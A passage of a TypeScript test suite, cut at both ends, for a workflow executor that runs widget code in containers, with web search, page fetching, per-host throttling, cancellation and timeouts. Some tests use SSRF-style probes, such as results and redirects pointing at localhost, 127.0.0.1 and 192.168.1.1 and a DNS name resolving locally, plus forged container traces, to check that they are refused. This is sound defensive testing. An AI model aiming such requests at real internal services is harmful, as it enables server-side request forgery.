      b.infra.surTrace = (t) => relayees.push(t);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.blocs.map((x) => [x.id, x.statut])).toEqual([["a", "pas-lance"], ["b", "repris"], ["c", "reussi"], ["sortie", "reussi"]]);
      expect(r.execution.blocs[0]!.journal).toEqual([]);
      expect(r.execution.blocs[1]).toMatchObject({ elements: 2, journal: [], debut: null });
      expect(r.execution.blocs[1]!.sortie).toBeUndefined();
      expect(relayees.map((t: any) => `${t.etape}:${t.bloc}`)).toEqual(["debut:c", "fin:c", "debut:sortie", "fin:sortie"]);
    });

    it("a trial sends no memory and returns none", async () => {
      const recu: string[] = [];
      const b = await banc(chaine("a", "b", "c"), {}, {
        lancer: () => {
          const p = lanceurScripte([{ t: "memoire", memoire: { c: { type: "code", valeur: "forgée" } } }, { t: "fin", donnees: null }])("", []);
          p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
          return p;
        },
        memoire: { a: { type: "code", valeur: 1 }, c: { type: "code", valeur: 2 } },
      });
      b.ctx.rejeu = rejeuDepuisC;
      const r = await executerWorkflow(b.ctx, b.infra);
      const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
      expect(lignes[0].rejeu).toEqual({ relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] } });
      expect(lignes[1]).toEqual({ t: "memoire", memoire: {} });
      expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    });

    it("outputs to reuse of over 4 MB stop the trial without launching a container", async () => {
      const b = await banc(chaine("a", "b", "c"));
      b.ctx.rejeu = { ...rejeuDepuisC, sorties: { b: "x".repeat(LIGNE_MAX_OCTETS) } };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: REPLAY_TOO_BIG });
      expect(REPLAY_TOO_BIG).toBe("Rejeu impossible : les sorties à reprendre dépassent 4 Mo");
      expect(b.commandes).toEqual([]);
      expect(r.execution).toMatchObject({ statut: "echouee", erreur: REPLAY_TOO_BIG, erreurNoyau: true });
    });
  });

  it("surTrace receives debut then fin of each block, with elements; a fake out-of-order trace is not relayed", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "sortie", etape: "debut" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        return [1, 2, 3];
      };`,
    });
    const relayees: unknown[] = [];
    b.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: [1, 2, 3] } });
    expect(relayees).toEqual([
      { bloc: "a", etape: "debut" },
      { bloc: "a", etape: "fin", statut: "reussi", elements: 3 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 3 },
    ]);
  });

  it("a surTrace that throws does not break the run", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default async () => 1;` });
    b.infra.surTrace = () => {
      throw new Error("relais cassé");
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.statut).toBe("reussie");
  });

  it("the container impossible to launch: erreur stop, failed run without a launched block", async () => {
    const b = await banc(chaine("a"));
    b.infra.atelier = { commandeRecolte: () => { throw new Error("Docker introuvable"); }, supprimerRecolte: async () => {} };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Récolte impossible à lancer : Docker introuvable" });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.blocs.every((x) => x.statut === "pas-lance")).toBe(true);
  });
});

describe("executerWorkflow: web search and open reads", () => {
  const BASE = "https://ddg.test/html/";
  const page = (nom: string) => readFileSync(new URL(`./fixtures/duckduckgo/${nom}`, import.meta.url), "utf8");
  const resultatsFixture = (() => {
    const r = extractResults(page("resultats.html"), 20);
    if (!("resultats" in r)) throw new Error("attendu : des résultats");
    return r.resultats;
  })();

  /** Throttle with a fake clock: each wait advances the clock, without ever really waiting. */
  const menagementFactice = () => {
    let t = 0;
    const attentes: number[] = [];
    const menagement = new Pacing({
      maintenant: () => t,
      attendre: async (ms) => {
        attentes.push(ms);
        t += ms;
      },
    });
    return { menagement, attentes };
  };

  /** A widget `a` → sortie whose code is given; `web` and the throttle set. */
  async function bancWeb(code: string, o: { web?: boolean; compte?: string[]; html?: Record<string, string>; pages?: { url: string; titre: string; texte: string; liens: [] }[]; menagement?: Pacing; delaiMs?: number } = {}) {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: o.pages ?? [], html: o.html ?? {} } });
    const b = await banc(chaine("a"), { "a.mjs": code }, { pont, compte: o.compte, accord: { profil: "perso" }, delaiMs: o.delaiMs });
    b.ctx.sources = { ...b.ctx.sources, ...(o.web !== undefined ? { web: o.web } : {}) };
    b.infra.menagement = o.menagement ?? menagementFactice().menagement;
    b.infra.urlRecherche = BASE;
    return { b, pont, html: () => pont.appels.filter((a) => a.methode === "lireHtmlInvisible") };
  }
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);
  /** Code that makes these calls one after the other and returns, for each, the result or « erreur: <message> ». */
  const enSuite = (appels: string[]) => `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
    export default async (e, w) => { const r = []; ${appels.map((a) => `r.push(await essai(${a}));`).join(" ")} return r; };`;

  it("chercherWeb returns the results of the recorded page, search url built on urlRecherche", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("clio fiabilité", { nombre: 3 })`]), {
      web: true,
      html: { [urlRecherche("clio fiabilité", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([resultatsFixture.slice(0, 3)]);
    expect(html().map((a) => a.args)).toEqual([[urlRecherche("clio fiabilité", BASE), { adressesLocales: true }]]);
  });

  it("chercherWeb drops results to a local address, then cuts to nombre", async () => {
    const bloc = (u: string) => `<div class="result"><a class="result__a" href="${u}">T</a><a class="result__snippet">E</a></div>`;
    const local = [
      "http://127.0.0.1:8080/admin",
      "http://localhost/x",
      "http://192.168.1.1/",
      "http://imprimante.local/",
      "http://[::1]/",
      "https://a.example/",
      "https://b.example/",
      "https://c.example/",
    ].map(bloc).join("");
    const { b } = await bancWeb(enSuite([`w.chercherWeb("x", { nombre: 2 })`]), { web: true, html: { [urlRecherche("x", BASE)]: local } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([[{ titre: "T", url: "https://a.example/", extrait: "E" }, { titre: "T", url: "https://b.example/", extrait: "E" }]]);
  });

  it("without web: WEB_REQUIS, no call to the bridge", async () => {
    const { b, pont } = await bancWeb(enSuite([`w.chercherWeb("x")`]), { html: { [urlRecherche("x", BASE)]: page("resultats.html") } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(pont.appels).toEqual([]);
  });

  it("widget with an account: WEB_REQUIS", async () => {
    // web with an account is refused at the widget.json read; the executor refuses anyway.
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("x")`]), {
      web: true,
      compte: ["mail.google.com"],
      html: { [urlRecherche("x", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(html()).toEqual([]);
  });

  it("31e recherche : PLAFOND_RECHERCHES, 30 lectures de HTML seulement", async () => {
    const { menagement, attentes } = menagementFactice();
    const { b, html } = await bancWeb(enSuite(Array.from({ length: 31 }, () => `w.chercherWeb("clio", { nombre: 1 })`)), {
      web: true,
      menagement,
      html: { [urlRecherche("clio", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as unknown[];
    expect(sortie.slice(0, 30)).toEqual(Array.from({ length: 30 }, () => resultatsFixture.slice(0, 1)));
    expect(sortie[30]).toBe(`erreur: ${SEARCHES_CAP}`);
    expect(html()).toHaveLength(30);
    // Throttled: 2 s between two searches.
    expect(attentes).toEqual(Array.from({ length: 29 }, () => 2000));
  });

  it("check page: RECHERCHE_REFUSEE, then RECHERCHES_ARRETEES without a new read", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
  });

  it("a queued search when the refusal arrives does not leave, and does not consume the search gap", async () => {
    const { menagement, attentes } = menagementFactice();
    const { b, html } = await bancWeb(
      `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
      export default async (e, w) => Promise.all([essai(w.chercherWeb("a")), essai(w.chercherWeb("b"))]);`,
      { web: true, menagement, html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
    // « b » waited for nothing; the next search waits 2 s from the end of « a », the only one that was played (not 2 s more).
    await menagement.rechercher(async () => {});
    expect(attentes).toEqual([2000]);
  });

  it("page changed: RESULTATS_ILLISIBLES, never an empty list; no result: empty list", async () => {
    const { b } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("changee.html"), [urlRecherche("b", BASE)]: page("aucun-resultat.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${UNREADABLE_RESULTS}`, []]);
  });

  it("web widget: the 101st open read (pages and feeds) throws TROP_DE_LECTURES", async () => {
    const web = await serveurWeb({ "/f": (res) => res.end("<rss><channel><item><title>T</title><link>https://x.example/</link></item></channel></rss>") });
    const { menagement, attentes } = menagementFactice();
    const espion = vi.spyOn(menagement, "lire");
    const { b, pont } = await bancWeb(
      `const essai = (p) => p.then(() => "ok", (e) => "erreur: " + e.message);
      export default async (e, w) => {
        const r = [];
        for (let i = 0; i < 40; i++) r.push(await essai(w.lirePage("https://www.pages.example/" + i)));
        for (let i = 0; i < 30; i++) r.push(await essai(w.recuperer("${web.url}/f")));
        for (let i = 0; i < 30; i++) r.push(await essai(w.lireFlux("${web.url}/f")));
        r.push(await essai(w.lirePage("https://pages.example/de-trop")));
        r.push(await essai(w.recuperer("${web.url}/f")));
        return r;
      };`,
      { web: true, menagement },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as string[];
    expect(sortie.slice(0, 100).every((x) => x === "ok")).toBe(true);
    expect(sortie.slice(100)).toEqual([`erreur: ${TOO_MANY_READS}`, `erreur: ${TOO_MANY_READS}`]);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(40);
    expect(web.requetes).toHaveLength(60);
    // Each goes through the throttle, per host: 1 s between two reads of the same host.
    expect(espion).toHaveBeenCalledTimes(100);
    expect(espion.mock.calls.slice(0, 40).every((c) => c[0] === "www.pages.example")).toBe(true);
    expect(espion.mock.calls.slice(40).every((c) => c[0] === "127.0.0.1")).toBe(true);
    expect(attentes.every((ms) => ms === 1000)).toBe(true);
    expect(attentes).toHaveLength(98);
  });

  it("web widget: a read redirected to another site waits for that site's throttle", async () => {
    const { menagement, attentes } = menagementFactice();
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://b.example/2", titre: "deux", texte: "", liens: [] }],
        redirections: { "https://a.example/court": "https://www.b.example/2", "https://a.example/meme": "https://www.a.example/x" },
      },
    });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `export default async (e, w) => [
          (await w.lirePage("https://b.example/1")).url,
          (await w.lirePage("https://a.example/court")).url,
          (await w.lirePage("https://a.example/meme")).url,
        ];`,
      },
      { pont },
    );
    b.ctx.sources = { ...b.ctx.sources, web: true };
    b.infra.menagement = menagement;
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["https://b.example/1", "https://www.b.example/2", "https://www.a.example/x"]);
    // b.example read just before: the redirect waits 1 s. a.example, released at the redirect, does not make
    // the 3rd read wait, redirected to the same site (www.).
    expect(pont.appels.filter((a) => a.methode === "changerHote").map((a) => a.args[0])).toEqual(["www.b.example", "www.a.example"]);
    expect(attentes).toEqual([1000]);
  });

  it("web widget: a fetch redirected to another site waits for that site's throttle", async () => {
    let ailleurs = "";
    // /vers-localhost redirects to the same server, under another host name.
    const web = await serveurWeb({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: ailleurs });
        res.end();
      },
    });
    ailleurs = `http://localhost:${web.port}/f`;
    const { menagement, attentes } = menagementFactice();
    const lire = vi.spyOn(menagement, "lire");
    const { b } = await bancWeb(
      `export default async (e, w) => [await w.recuperer("${ailleurs}"), await w.recuperer("${web.url}/vers-localhost")];`,
      { web: true, menagement },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["fini", "fini"]);
    expect(lire.mock.calls.map((c) => c[0])).toEqual(["localhost", "127.0.0.1"]);
    // localhost read just before: the redirect waits for its gap.
    expect(attentes).toEqual([1000]);
  });

  it("recuperer: the wait for a redirect's site is bounded by the stop (and the timeout), without a request to the target", async () => {
    let cible = "";
    const web = await serveurWeb({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: cible });
        res.end();
      },
    });
    cible = `http://localhost:${web.port}/f`;
    const arret = new AbortController();
    const changerHote = vi.fn(() => new Promise<void>(() => {}));
    const p = fetch(`${web.url}/vers-localhost`, "texte", null, true, arret.signal, changerHote);
    p.catch(() => {});
    await vi.waitFor(() => expect(changerHote).toHaveBeenCalledWith("localhost"));
    arret.abort(new Error("Exécution arrêtée"));
    await expect(p).rejects.toThrow("Exécution arrêtée");
    expect(web.requetes).toEqual(["/vers-localhost"]);
  });

  it("recuperer: a name that resolves to the machine is refused at connection, without a request", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    // Like 127.0.0.1.nip.io, without network: the name passes the text check, its address is local.
    const resolution = vi.spyOn(dns, "lookup").mockImplementation(((_h: string, _o: unknown, rappel: (e: null, a: dns.LookupAddress[]) => void) =>
      rappel(null, [{ address: "127.0.0.1", family: 4 }])) as unknown as typeof dns.lookup);
    try {
      await expect(fetch(`http://piege.example:${web.port}/`, "texte", null, false)).rejects.toThrow("Adresse locale refusée");
    } finally {
      resolution.mockRestore();
    }
    expect(web.requetes).toEqual([]);
  });

  it("widget without web: 150 reads go through, no throttle wait", async () => {
    const espion = new Pacing({ attendre: async () => { throw new Error("aucune attente attendue"); } });
    const lire = vi.spyOn(espion, "lire");
    const rechercher = vi.spyOn(espion, "rechercher");
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.lirePage("https://pages.example/" + i); return "fini"; };`,
      { menagement: espion },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(150);
    expect(lire).not.toHaveBeenCalled();
    expect(rechercher).not.toHaveBeenCalled();
  });

  it("run stop: a read waiting for the throttle does not leave", async () => {
    let t = 0;
    const enAttente: (() => void)[] = [];
    const menagement = new Pacing({ maintenant: () => t, attendre: () => new Promise<void>((ok) => enAttente.push(ok)) });
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { await w.lirePage("https://pages.example/1"); return w.lirePage("https://pages.example/2"); };`,
      { web: true, menagement, delaiMs: 300 },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    // The gap elapses after the stop: the queued read does not leave.
    t += 10_000;
    for (const ok of enAttente.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible").map((a) => a.args[0])).toEqual(["https://pages.example/1"]);
  });

  it("end of the run: a search still queued does not leave", async () => {
    let t = 0;
    const enAttente: (() => void)[] = [];
    const menagement = new Pacing({ maintenant: () => t, attendre: () => new Promise<void>((ok) => enAttente.push(ok)) });
    const { b, html } = await bancWeb(
      `export default async (e, w) => { await w.chercherWeb("a"); w.chercherWeb("b").catch(() => {}); return "fini"; };`,
      { web: true, menagement, html: { [urlRecherche("a", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    t += 10_000;
    for (const ok of enAttente.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(html()).toHaveLength(1);
  });
});

describe("executerWorkflow: a stop cancels the reads in progress", () => {
  const BASE = "https://ddg.test/html/";
  /** A fake container: sends these calls, then waits to be killed; keeps what the kernel writes to it. */
  const conteneurAppels = (appels: { f: string; a: unknown }[]) => {
    const recu: string[] = [];
    let tuer = () => {};
    const lancer: ProcessLauncher = () => {
      const stdout = new PassThrough();
      const stderr = new PassThrough();
      const stdin = new PassThrough();
      stdin.on("data", (d) => recu.push(String(d)));
      let finir!: (c: number | null) => void;
      const fin = new Promise<number | null>((ok) => (finir = ok));
      tuer = () => {
        stdout.end();
        stderr.end();
        finir(null);
      };
      setImmediate(() => appels.forEach((x, i) => stdout.write(JSON.stringify({ t: "appel", n: i + 1, ...x }) + "\n")));
      return { stdin, stdout, stderr, tuer: () => tuer(), fin };
    };
    return {
      lancer,
      /** The container is removed from outside (quitting the browser). */
      tuer: () => tuer(),
      reponses: () => recu.join("").split("\n").filter((l) => l.includes(`"t":"reponse"`)),
    };
  };
  const annulees = (pont: PontFactice) => pont.appels.filter((a) => a.methode === "lectureAnnulee").map((a) => a.args[0]);
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);

  it("timeout exceeded: pages (public, with an account) and fetch in progress cancelled, nothing comes back to the container", async () => {
    const fermees: string[] = [];
    const web = await serveurWeb({ "/lent": (res) => void res.on("close", () => fermees.push("/lent")) });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], suspendues: ["https://pages.example/a", "https://app.daily.dev/b"] } });
    const c = conteneurAppels([
      { f: "lirePage", a: { url: "https://pages.example/a" } },
      { f: "lirePage", a: { url: "https://app.daily.dev/b", compte: true } },
      { f: "recuperer", a: { url: `${web.url}/lent` } },
    ]);
    const b = await banc(chaine("a"), {}, { pont, compte: ["app.daily.dev"], publiques: ["pages.example", "127.0.0.1"], accord: { profil: "perso" }, delaiMs: 300, lancer: c.lancer });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => {
      expect(annulees(pont).sort()).toEqual(["https://app.daily.dev/b", "https://pages.example/a"]);
      expect(fermees).toEqual(["/lent"]);
    });
    await new Promise((ok) => setTimeout(ok, 20));
    expect(c.reponses()).toEqual([]);
  });

  it("container removed (quit): its reads are cancelled, not those of another run", async () => {
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: { pages: [{ url: "https://pages.example/b", titre: "B", texte: "", liens: [] }], suspendues: ["https://pages.example/a", "https://pages.example/b"] },
    });
    const autre = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://pages.example/b")).titre;` }, { pont });
    const c = conteneurAppels([{ f: "lirePage", a: { url: "https://pages.example/a" } }]);
    const b = await banc(chaine("a"), {}, { pont, lancer: c.lancer });
    const rAutre = executerWorkflow(autre.ctx, autre.infra);
    const r = executerWorkflow(b.ctx, b.infra);
    await vi.waitFor(() => expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(2));
    c.tuer();
    expect((await r).issue.t).toBe("echec");
    await vi.waitFor(() => expect(annulees(pont)).toEqual(["https://pages.example/a"]));
    // The other run, for its part, still reads.
    expect(pont.relacher("https://pages.example/b")).toBe(1);
    expect(valeur(await rAutre)).toBe("B");
    expect(annulees(pont)).toEqual(["https://pages.example/a"]);
  });

  it("web widget: a read and a search in progress cancelled free their turn, the gap counts from the cancellation", async () => {
    let t = 0;
    const attentes: number[] = [];
    const menagement = new Pacing({
      maintenant: () => t,
      attendre: async (ms) => {
        attentes.push(ms);
        t += ms;
      },
    });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://pages.example/2", titre: "deux", texte: "", liens: [] }],
        html: { [urlRecherche("b", BASE)]: readFileSync(new URL("./fixtures/duckduckgo/aucun-resultat.html", import.meta.url), "utf8") },
        suspendues: ["https://pages.example/1", urlRecherche("a", BASE)],
      },
    });
    const preparer = (bb: Banc) => {
      bb.ctx.sources = { ...bb.ctx.sources, web: true };
      bb.infra.menagement = menagement;
      bb.infra.urlRecherche = BASE;
    };
    const c = conteneurAppels([
      { f: "lirePage", a: { url: "https://pages.example/1" } },
      { f: "chercherWeb", a: { requete: "a", nombre: 1 } },
    ]);
    const b = await banc(chaine("a"), {}, { pont, delaiMs: 300, lancer: c.lancer });
    preparer(b);
    expect((await executerWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => expect(annulees(pont).sort()).toEqual(["https://pages.example/1", urlRecherche("a", BASE)].sort()));
    // Another run on the same throttle: neither the host's lane nor the searches' lane stays taken.
    const suivante = await banc(
      chaine("a"),
      { "a.mjs": `export default async (e, w) => [(await w.lirePage("https://pages.example/2")).titre, (await w.chercherWeb("b", { nombre: 1 })).length];` },
      { pont, delaiMs: 3000 },
    );
    preparer(suivante);
    expect(valeur(await executerWorkflow(suivante.ctx, suivante.infra))).toEqual(["deux", 0]);
    // The cancelled requests had left: the gap counts from their cancellation (t = 0). The read waits its 1 s,
    // then the search the rest of its 2 s (1 s already elapsed).
    expect(attentes).toEqual([1000, 1000]);
  });
});

describe("executerWorkflow: watch (duration, chain, publications, memory along the way)", () => {
  /** liste (code) → fiche → avis (source.recuperer per element) → sortie. */
  const veille = (o: { auFilDeLEau?: boolean } = {}) => ({
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "avis", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "avis" }, { de: "avis", vers: "sortie" }],
  });

  /**
   * A fake container that writes its lines one by one (a function is called in its place: advance the clock; a text
   * is written as is, several lines at once);
   * `recu` receives what the kernel writes to it; `bloque`: it never exits on its own (only killed).
   */
  const lanceurPas = (pas: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let tuer = () => {};
    const fin = new Promise<number | null>((ok) => {
      tuer = () => ok(null);
      void (async () => {
        for (const p of pas) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })();
    });
    return { stdin, stdout, stderr, tuer: () => tuer(), fin };
  };

  /** A clock that the steps make advance. */
  const horlogeFactice = (b: Banc) => {
    let t = MAINTENANT.getTime();
    b.infra.horloge = () => new Date(t);
    return (ms: number) => () => {
      t += ms;
    };
  };

  /** The workshop's real command, kept to read its `timeout`. */
  const brancherAtelier = (b: Banc) => {
    const atelier = new Atelier({ chemins: spacePaths("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const commandes: string[][] = [];
    b.infra.atelier = {
      commandeRecolte: (id, d, m, s) => {
        const c = atelier.commandeRecolte(id, d, m, s);
        commandes.push(c);
        return c;
      },
      supprimerRecolte: async () => {},
    };
    return () => {
      const c = commandes[0]!;
      return c.slice(c.indexOf("timeout"), c.indexOf("timeout") + 4);
    };
  };

  /** The delays given to setTimeout during `f`. */
  async function delaisPendant(f: () => Promise<unknown>): Promise<unknown[]> {
    const espion = vi.spyOn(globalThis, "setTimeout");
    try {
      await f();
      return espion.mock.calls.map((c) => c[1]);
    } finally {
      espion.mockRestore();
    }
  }

  const debutBloc = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const finBloc = (id: string, sortie: unknown = [{ url: "https://a.example/1" }], statut = "reussi") => ({ t: "bloc", id, etape: "fin", statut, sortie });
  const pub = (donnees: unknown, faits: number, total: number) => ({ t: "publication", donnees, faits, total });
  const essai = (b: Banc) => {
    b.ctx.declencheur = "rejeu";
    b.ctx.rejeu = { relances: [...b.ctx.valide.ordre], sorties: {}, repris: {} };
  };

  it("the watch() chain is fiche → avis", () => {
    expect(streamingChain(valide(veille({ auFilDeLEau: true })))).toEqual(["fiche", "avis"]);
  });

  it("widget without the new fields: debut line identical to today, timeout 180, delay 200 s", async () => {
    const recu: string[] = [];
    const b = await banc(veille(), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    const timeout = brancherAtelier(b);
    const delais = await delaisPendant(() => executerWorkflow(b.ctx, b.infra));
    const { workflow, ordre } = b.ctx.valide;
    expect(recu.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: MAINTENANT.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delais).toContain(200_000);
  });

  it("Gmail widget (account, recolte.mjs alone): identical debut line, timeout 180, delay 200 s, neither surMemoire nor memoire on an echec", async () => {
    const recu: string[] = [];
    const implicite = { version: 1, blocs: [{ id: "recolte", type: "code", parametres: { source: "recolte.mjs" } }, { id: "sortie", type: "sortie", parametres: { vers: "widget" } }], liens: [{ de: "recolte", vers: "sortie" }] };
    const b = await banc(implicite, {}, {
      compte: ["mail.google.com"],
      accord: { profil: "p1" },
      lancer: lanceurPas([{ t: "memoire", memoire: { recolte: { type: "code", valeur: 1 } } }, { t: "journal", bloc: "recolte", texte: "x" }, { t: "echec", erreur: "cassé" }], { recu }),
    });
    const timeout = brancherAtelier(b);
    const memoires: unknown[] = [];
    b.infra.surMemoire = async (m) => void memoires.push(m);
    let issue: unknown;
    const delais = await delaisPendant(async () => {
      issue = (await executerWorkflow(b.ctx, b.infra)).issue;
    });
    const { workflow, ordre } = b.ctx.valide;
    expect(recu.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: MAINTENANT.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delais).toContain(200_000);
    expect(memoires).toEqual([]);
    expect(issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });
  });

  it("dureeMaxMinutes 30: debut carries limiteMs 1,800,000 and progressif, container launched with timeout 1830, delay 1,850 s", async () => {
    const recu: string[] = [];
    const b = await banc(veille(), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    b.ctx.dureeMaxMinutes = 30;
    const timeout = brancherAtelier(b);
    const delais = await delaisPendant(() => executerWorkflow(b.ctx, b.infra));
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut).toMatchObject({ t: "debut", limiteMs: 1_800_000, progressif: true });
    expect(timeout()).toEqual(["timeout", "-k", "5", "1830"]);
    expect(delais).toContain(1_850_000);
    expect(delais).not.toContain(200_000);
  });

  it("auFilDeLEau without dureeMaxMinutes: progressif without limiteMs; a trial is never progressive", async () => {
    const recu: string[] = [];
    const b = await banc(veille({ auFilDeLEau: true }), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    await executerWorkflow(b.ctx, b.infra);
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut.progressif).toBe(true);
    expect("limiteMs" in debut).toBe(false);

    const recuEssai: string[] = [];
    const e = await banc(veille({ auFilDeLEau: true }), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu: recuEssai }) });
    e.ctx.dureeMaxMinutes = 30;
    essai(e);
    await executerWorkflow(e.ctx, e.infra);
    const debutEssai = JSON.parse(recuEssai.join("").split("\n")[0]!);
    expect("progressif" in debutEssai).toBe(false);
    expect(debutEssai.limiteMs).toBe(1_800_000);
  });

  it("chain traces accepted; an out-of-order chain end rejected", async () => {
    const enChaine = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        { t: "journal", bloc: "fiche", texte: "lu" },
        finBloc("fiche"), finBloc("avis"),
        debutBloc("sortie"), finBloc("sortie"),
